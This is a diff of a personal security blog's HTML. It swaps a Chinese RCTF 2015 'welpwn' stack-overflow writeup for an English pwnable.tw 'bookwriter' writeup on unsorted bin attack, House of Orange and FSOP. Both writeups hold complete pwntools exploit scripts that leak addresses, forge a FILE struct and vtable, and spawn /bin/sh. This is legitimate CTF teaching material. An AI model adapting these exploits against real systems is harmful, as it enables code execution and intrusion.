@@ -7,20 +7,20 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <meta name="baidu-site-verification" content="RNCre9JfIO" />
   <link rel="dns-prefetch" href="https://sunichi.github.io">
-  <title>rctf2015 welpwn writeup | Sunichi&#39;s Blog</title>
+  <title>pwnable tw bookwriter writeup | Sunichi&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下    size data     0x10 s2   0x08 saved ebp   0x08 return address   0x400 buf    构造如下payload：">
-<meta name="keywords" content="ctf,pwn">
+  <meta name="description" content="This pwn need to use Unsorted Bin Attack and House Of Orange to exploit. First, I would like to introduce Unsorted Bin Attack, House Of Orange and some relevant technique. 0x01 Unsorted Bin AttackEnvi">
+<meta name="keywords" content="ctf,pwn,pwnable-tw">
 <meta property="og:type" content="article">
-<meta property="og:title" content="rctf2015 welpwn writeup">
-<meta property="og:url" content="https://sunichi.github.io/2018/01/09/rctf15-welpwn/index.html">
+<meta property="og:title" content="pwnable tw bookwriter writeup">
+<meta property="og:url" content="https://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
-<meta property="og:description" content="buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下    size data     0x10 s2   0x08 saved ebp   0x08 return address   0x400 buf    构造如下payload：">
+<meta property="og:description" content="This pwn need to use Unsorted Bin Attack and House Of Orange to exploit. First, I would like to introduce Unsorted Bin Attack, House Of Orange and some relevant technique. 0x01 Unsorted Bin AttackEnvi">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-01-09T01:02:04.000Z">
+<meta property="og:updated_time" content="2018-07-02T09:00:00.658Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="rctf2015 welpwn writeup">
-<meta name="twitter:description" content="buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下    size data     0x10 s2   0x08 saved ebp   0x08 return address   0x400 buf    构造如下payload：">
+<meta name="twitter:title" content="pwnable tw bookwriter writeup">
+<meta name="twitter:description" content="This pwn need to use Unsorted Bin Attack and House Of Orange to exploit. First, I would like to introduce Unsorted Bin Attack, House Of Orange and some relevant technique. 0x01 Unsorted Bin AttackEnvi">
   
     <link rel="alternative" href="/atom.xml" title="Sunichi&#39;s Blog" type="application/atom+xml">
   
@@ -154,62 +154,70 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-rctf15-welpwn" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-pwnable-tw-bookwriter" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      rctf2015 welpwn writeup
+      pwnable tw bookwriter writeup
     </h1>
   
 
         
-        <a href="/2018/01/09/rctf15-welpwn/" class="archive-article-date">
-  	<time datetime="2018-01-09T00:55:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-09</time>
+        <a href="/2018/07/02/pwnable-tw-bookwriter/" class="archive-article-date">
+  	<time datetime="2018-07-02T08:37:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-02</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><code>buf</code>的空间大小为0x400，<code>read()</code>的读入长度也为0x400。进入<code>echo()</code>函数继续查找。</p>
-<p>字符串<code>s2</code>长度为0x10，内容从<code>buf</code>进行拷贝，当遇到<code>\x00</code>时特，停止拷贝。栈布局如下</p>
-<table>
-<thead>
-<tr>
-<th>size</th>
-<th>data</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>0x10</td>
-<td>s2</td>
-</tr>
-<tr>
-<td>0x08</td>
-<td>saved ebp</td>
-</tr>
-<tr>
-<td>0x08</td>
-<td>return address</td>
-</tr>
-<tr>
-<td>0x400</td>
-<td>buf</td>
-</tr>
-</tbody>
-</table>
-<p>构造如下<code>payload</code>：<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">24</span> + return_addr</span><br></pre></td></tr></table></figure></p>
-<p>由于字符串复制遇<code>\x00</code>终止，因此最多只能传入一个地址。但由于返回地址之后就是我们所输入的<code>buf</code>，所以需要利用<code>buf</code>进行控制。<code>buf</code>的前32字节为上述<code>payload</code>，因此需要利用gadget从栈中移除32字节，使用pop四次返回即可，随后便进入预先设计好的控制流中。由于原先的返回地址非<code>\x00</code>长度与<code>pop4_addr</code>相同，因此可以成功写入。leak函数设计如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">24</span> + p64(pop4_addr)</span><br><span class="line">    payload += p64(pop6_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(addr) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr) + <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">    payload += p64(start_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x400</span>, <span class="string">'a'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    p.recv(<span class="number">0x400</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
-<p>获取<code>system</code>地址后：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">24</span> + p64(pop4_addr)</span><br><span class="line">payload += p64(pop6_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(call_addr) + <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload += p64(poprdi_addr) + p64(bss_addr) + p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>, <span class="string">'a'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <p>This pwn need to use Unsorted Bin Attack and House Of Orange to exploit. First, I would like to introduce Unsorted Bin Attack, House Of Orange and some relevant technique.</p>
+<h4 id="0x01-Unsorted-Bin-Attack"><a href="#0x01-Unsorted-Bin-Attack" class="headerlink" title="0x01 Unsorted Bin Attack"></a>0x01 Unsorted Bin Attack</h4><p>Environment: I use 64 bit to make example.</p>
+<p>Condition: Control unsorted chunk’s bk pointer.</p>
+<p>Unsorted Bin uses FIFO strategy.</p>
+<a id="more"></a>
+<p>Steps:</p>
+<ul>
+<li>Set free unsorted chunk’s pointer to target_addr - 0x10, this chunk will be the first free chunk in Unsorted Bin.</li>
+<li>Call malloc, the first free chunk will be put into the corresponding bin.</li>
+<li>Then the operations below will be performed:</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim = unsorted_bin(av)-&gt;bk = p;</span><br><span class="line">bck = victim-&gt;bk = target_addr - <span class="number">0x10</span>; <span class="comment">// victim-&gt;bk is p-&gt;bk</span></span><br><span class="line">unsorted_bin(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_bin(av);            <span class="comment">// bck-&gt;fd is *(target_addr)</span></span><br></pre></td></tr></table></figure>
+<p>So, use Unsorted Bin Attack can set target_addr’s value to <code>main_arean+88</code>.</p>
+<h4 id="0x02-FSOP"><a href="#0x02-FSOP" class="headerlink" title="0x02 FSOP"></a>0x02 FSOP</h4><p>FSOP(File-Stream Oriented Programming), like ROP and SROP, but it use FILE struct to construct the exploit chain. One of the use of FSOP is House Of Orange.</p>
+<p>FSOP mainly use <code>_IO_ﬂush_all_lockp</code> function, it flushes all standard I/O stream before process being terminated. It travels all FILE struct by element _chain pointer. The code:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain; <span class="comment">// travel by _chain</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>According to the code above, <code>_IO_flush_all_lockp</code> which called by <code>abort</code>  will call<code>_IO_OVERFLOW (fp, EOF)</code>, and we can hijack 用<code>_IO_OVERFLOW</code> through FILE struct’s vtable. There are 3 situations that program will call <code>abort</code>:</p>
+<ul>
+<li>glibc abort</li>
+<li>exit function</li>
+<li>main return</li>
+</ul>
+<p>When there occurs some errors in <code>malloc</code>, it will call <code>malloc_printerr</code> and then <code>malloc_printerr</code> calls <code>abort</code>.</p>
+<p>This exploit makes advantage of changing <code>_IO_list_all</code> and forges <code>vtable</code> which includes <code>_IO_OVERFLOW</code> pointer.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="0x03-Pwnable-tw-bookwriter"><a href="#0x03-Pwnable-tw-bookwriter" class="headerlink" title="0x03 Pwnable.tw bookwriter"></a>0x03 Pwnable.tw bookwriter</h4><h5 id="leak-libc-information-and-heap-address"><a href="#leak-libc-information-and-heap-address" class="headerlink" title="leak libc information and heap address"></a>leak libc information and heap address</h5><p>At the beginning of the program, pwner needs to input the name of author on <code>bss_0x602060</code> which behind the chunk_list(<code>bss_0x6020A0</code>). Pwner can input a string of length 0x40 without \x00, when program output the author’s name, the heap address leaks.</p>
+<p>In <code>Edit()</code> function, there are two lines of code following, in <code>InputString()</code> function, it doesn’t end up input string with \x00 which leads to larger string length.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InputString((__int64)CHUNK_LIST[idx], SIZE_LIST[idx]);</span><br><span class="line">SIZE_LIST[idx] = <span class="built_in">strlen</span>(CHUNK_LIST[idx]);</span><br></pre></td></tr></table></figure>
+<p>The first part of expolit:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    p = process(<span class="string">'./bookwriter'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    p.recvuntil(<span class="string">'Author :'</span>)</span><br><span class="line">    <span class="comment"># input auther name of length 0x40 without \x00</span></span><br><span class="line">    p.send(<span class="string">'A'</span> * <span class="number">0x40</span>)</span><br><span class="line">    </span><br><span class="line">    Add(p, <span class="number">0x18</span>, <span class="string">'A'</span> * <span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    <span class="comment"># extend size of chunk 0</span></span><br><span class="line">    Edit(p, <span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># overflow top chunk size and let its size to be 0xfe1</span></span><br><span class="line">    Edit(p, <span class="number">0</span>, <span class="string">'\x00'</span> * <span class="number">0x18</span> + <span class="string">'\xe1\x0f\0'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap address by author name</span></span><br><span class="line">    recv = Info(p, null, <span class="number">0</span>)</span><br><span class="line">    heap_addr = u64(recv[<span class="string">'old_author'</span>][<span class="number">0x40</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">print</span> hex(heap_addr)</span><br></pre></td></tr></table></figure>
+<p>But how to leak libc information while there is no <code>free()</code> in the program? </p>
+<p>When user malloc a chunk whose size is larger than top chunk, the program will call <code>sysmalloc()</code> and free the top chunk into unsorted bin. Then the top chunk fd and bk will point to the address which is relevant with  <code>main_arena</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># trigger free in sysmalloc, now the top chunk size is 0xfe1</span></span><br><span class="line">Add(p, <span class="number">0x1000</span>, <span class="string">'sunichi'</span>) <span class="comment"># 1 0x1000 &gt; 0xfe1</span></span><br><span class="line">Add(p, <span class="number">0x40</span>, <span class="string">'sunichi!'</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">recv = View(p, <span class="number">2</span>)</span><br><span class="line">main_arena_88 = u64(recv[<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = main_arena_88 - <span class="number">0x3c4b78</span> - (<span class="number">1640</span> - <span class="number">88</span>)</span><br><span class="line">system_addr = libc_base_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io_list_all_addr = libc_base_addr + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br></pre></td></tr></table></figure>
+<p>Now, we know the heap and libc address and the next step is to perform unsorted bin attack.</p>
+<p>First, construct a chunk of size 0x61. When it comes to <code>malloc(1)</code>, the fake chunk will be put into fastbin[4]. Use unsorted bin attack, <code>_IO_list_all</code> will be changed to <code>main_arena+88</code>. After the fake chunk being put into fastbin[4], the <code>malloc()</code> will continue to find the next free unsorted chunk. Because next chunk’s size is 0, <code>malloc()</code> then triggers <code>printerr()</code>. So the program searches the FILE struct from <code>_IO_list_all</code> whose value is already <code>main_arena+88</code> and calls <code>FILE_OVERFLOW()</code>.</p>
+<p>The first FILE struct is invalid, and through the <code>main_arena+88-&gt;_chain</code>(<code>main_arena+216</code>), the program will find the next FILE struct whose address is fastbin[4]’s first chunk which is forged by pwner. So the following code will be triggered:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILE_OVERFLOW(fp, EOF) =&gt; system(fp) =&gt; system('/bin/sh')</span><br></pre></td></tr></table></figure>
+<p>The last part of exploits:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Index overflow, the size of chunk[0] will be changed to heap address</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3</span>, <span class="number">0x9</span>):</span><br><span class="line">      Add(p, <span class="number">0x20</span>, str(i) * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">  vtable_addr = heap_addr + <span class="number">0x248</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="number">0x170</span> * <span class="string">'\x00'</span></span><br><span class="line"></span><br><span class="line">  fake_stream = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">  fake_stream += p64(<span class="number">0</span>) + p64(io_list_all_addr - <span class="number">0x10</span>) <span class="comment"># unsorted bin attack</span></span><br><span class="line">  fake_stream = fake_stream.ljust(<span class="number">0xa0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">  fake_stream += p64(heap_addr + <span class="number">0x250</span>)</span><br><span class="line">  fake_stream = fake_stream.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">  fake_stream += p64(<span class="number">1</span>) + <span class="number">2</span> * p64(<span class="number">0</span>) + p64(vtable_addr)</span><br><span class="line"></span><br><span class="line">  payload += fake_stream</span><br><span class="line">  payload += p64(<span class="number">2</span>)</span><br><span class="line">  payload += p64(<span class="number">3</span>)</span><br><span class="line">  payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">  Edit(p, <span class="number">0</span>, payload)</span><br><span class="line">  </span><br><span class="line">  p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">  p.sendline(str(<span class="number">1</span>))</span><br><span class="line">  p.recvuntil(<span class="string">'Size of page :'</span>)</span><br><span class="line">  p.sendline(str(<span class="number">0x10</span>))</span><br><span class="line">  p.interactive()</span><br></pre></td></tr></table></figure>
 <p><br></p>
 <blockquote>
-<p>参考文章和bin下载：<a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a></p>
+<h5 id="Relevant-Article"><a href="#Relevant-Article" class="headerlink" title="Relevant Article"></a>Relevant Article</h5><p><a href="https://bbs.pediy.com/thread-223334.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223334.htm</a></p>
+<p><a href="http://weaponx.site/2018/06/11/BookWriter-Writeup-pwnable-tw/" target="_blank" rel="noopener">http://weaponx.site/2018/06/11/BookWriter-Writeup-pwnable-tw/</a></p>
+<p><a href="http://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/" target="_blank" rel="noopener">http://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/</a></p>
 </blockquote>
 
       
@@ -250,6 +258,10 @@
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwnable-tw</a>
         		</li>
       		
 		</ul>
@@ -305,7 +317,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://sunichi.github.io/2018/01/09/rctf15-welpwn/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -319,18 +331,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/02/02/cyberearth-xctf-pwn-stack/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          cyberearth xctf pwn stack writeup
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/01/07/lctf16-pwn100/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">lctf15 pwn100 writeup</div>
+    <a href="/2018/06/15/suctf18-pwn-noend/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">suCTF pwn noend writeup</div>
       <i class="icon-circle-right"></i>
     </a>
   
